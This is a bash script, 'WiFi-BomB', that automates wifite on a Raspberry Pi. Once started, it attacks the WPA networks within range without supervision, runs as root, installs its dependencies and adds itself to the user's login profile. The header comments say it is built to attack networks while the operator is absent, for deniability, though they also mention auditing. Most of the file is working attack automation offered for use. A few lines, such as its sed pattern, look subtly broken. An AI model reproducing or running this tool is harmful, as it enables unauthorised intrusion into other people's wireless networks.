#!/bin/bash

##________The programs theory was created by bigz3y(Zac R-S), with the written script mainly done by Lem0nY___________________________________

## this is a program that automates the use of Wifite on raspberry pi (but not limited to a raspberry pi for use however).
##this was created so that a user can plug the raspberry pi into power, and have it attack all networks it comes across
##for about 15 minutes. This is so that the attack can take place without the user being present at the location, allowing a
##fair amount of plausability. IT CAN BE USED ETHICALLY, it could also be used to mass audit local ap's en masse, streamlining the wifi 
##pentesting process.

## Important Variables
declare -a COMPATIBLE_DISTROS=("Distributor ID:	Raspbian" "Distributor ID:	Ubuntu" "Distributor ID:	Debian"  "Distributor ID:	ManjaroLinux")

## These variables can be modified to change the approximate amount of time 
## that the script will spend scanning. The synax for these values is a 
## numerical value, then a character to define a unit of time. 
## E.g. s: for second, m: for minute, d: for day
SCAN_TIME=23s
# RUN_TIME=15m

COLUMNS=$(tput cols) 

US="Created by Lem0nY and bigz3y"
THEM="Using wifite2 by derv82"

PWD=`pwd`
FILE_LOCATION=$PWD/Wifi-BomB.sh

## 
DEP_FILE=/etc/wifibomb_deps

function locate_module() {
	ORIGINAL_LOCATION=`pwd`
	MODULE_LOCATION=`modinfo -F filename brcmfmac | sed -n -e 's/.*\/(?!\/brcmfmac.ko) //p'`
}

function yes_killer() {
	Y_PID=`pidof yes all`
	sleep 10s
	kill -s SIGPIPE $Y_PID
}

function wifite_killer() {
	W_PID=`pidof python /usr/bin/wifite`
	kill -s SIGINT $W_PID
}

function network_selection() {
	sleep $RUN_TIME
	$(wifite_killer)
	$(wifite_killer)
}

function kill_scan() {
	sleep $SCAN_TIME
	$(wifite_killer)
	# $(yes_killer)
	# $(network_selection)
}

function start_wifite() {
	$(kill_scan) &
	printf "\e[91m%*s\n" $(((${#US}+$COLUMNS)/2)) "$US"
	printf "%*s\n\n" $(((${#THEM}+$COLUMNS)/2)) "$THEM"
	yes all | wifite --kill -wpa -wpat 120 -i wlan1 # -quiet #| perl -e '$| = 1; $f = "%-" . `tput cols` . "s\r"; $f =~ s/\n//; while (<>) {s/\n//; printf $f, $_;} print "\n"'
}

function install_dependencies() {
	if [ ! -f "$DEP_FILE" ]; then
		echo "\n Installing dependencies: The system will automatically reboot when finished \n"
		apt update

		# Install wifite and xdotools (both dependencies of this script)
		echo y | apt install wifite perl

		# Make it run on boot
		# cp /home/pi/WiFi-BomB/WiFi-BomB.sh /etc/init.d/WiFi-BomB.sh
		# chmod 755 /etc/init.d/WiFi-BomB.sh
		# update-rc.d WiFi-BomB.sh defaults
		echo "sudo bash /home/pi/WiFi-BomB/WiFi-BomB.sh" >> /home/pi/.profile

		## NOT CURRENTLY WORKING
		# Install nexmon custom firmware (to allow pi's card to be put in monitor mode)
		# echo y | apt install git libgmp3-dev gawk qpdf bison flex make raspberrypi-kernel-headers
		# git clone https://github.com/seemoo-lab/nexmon.git
		
		# cd nexmon/buildtools/isl-0.10
		# ./configure
		# make
		# make install
		# ln -s /usr/local/lib/libisl.so /usr/lib/arm-linux-gnueabihf/libisl.so.10		

		# cd && cd nexmon
		# source setup_env.sh
		# make
		# cd patches/bcm43455c0/7_45_189/nexmon/
		# make
		# make backup-firmware
		# make install-firmware
		# cd && cd nexmon/utililities/nexutil
		# make 
		# make install
		# locate_module
		# mv "$MODULE_LOCATION"/brcmfmac.ko "$MODULE_LOCATION"/brcmfmac.ko.orig
		# cd && cp nexmon/patches/bcm43455c0/7_45_189/nexmon/brcmfmac_4.19.y-nexmon/brcmfmac.ko "$MODULE_LOCATION"
		# depmod -a

		# Create file to prevent this from being run again
		touch $DEP_FILE

		reboot
	else
		echo -e "\e[33mDependencies are already installed \n"
	fi
}

function distro_checker() {
	DISTRO=`lsb_release -i`
	for POSSIBLE_DISTRO in "${COMPATIBLE_DISTROS[@]}"; do
		if [ "$POSSIBLE_DISTRO" == "$DISTRO" ]; then
			RESULT=1
			break
		else
			RESULT=0
		fi
	done
}

if [ "$(id -u)" == 0 ]; then
	echo -e "\e[91m  ▄█     █▄   ▄█     ▄████████  ▄█       ▀█████████▄   ▄██████▄    ▄▄▄▄███▄▄▄▄   ▀█████████▄  \n ███     ███ ███    ███    ███ ███         ███    ███ ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ \n ███     ███ ███▌   ███    █▀  ███▌        ███    ███ ███    ███ ███   ███   ███   ███    ███ \n ███     ███ ███▌  ▄███▄▄▄     ███▌       ▄███▄▄▄██▀  ███    ███ ███   ███   ███  ▄███▄▄▄██▀  \n ███     ███ ███▌ ▀▀███▀▀▀     ███▌      ▀▀███▀▀▀██▄  ███    ███ ███   ███   ███ ▀▀███▀▀▀██▄  \n ███     ███ ███    ███        ███         ███    ██▄ ███    ███ ███   ███   ███   ███    ██▄ \n ███ ▄█▄ ███ ███    ███        ███         ███    ███ ███    ███ ███   ███   ███   ███    ███ \n  ▀███▀███▀  █▀     ███        █▀        ▄█████████▀   ▀██████▀   ▀█   ███   █▀  ▄█████████▀  \n"
	echo  -e "\033[5m\e[32mthe bomb has been planted...\033[0m"
	distro_checker
	if [ $RESULT == 0 ]; then
		echo "Automatic dependency installation is not supported on this distribution. You must install all dependencies manually"
	elif [ $RESULT == 1 ]; then
		install_dependencies
	fi
	start_wifite
else
	echo "This program needs to be run as root"
fi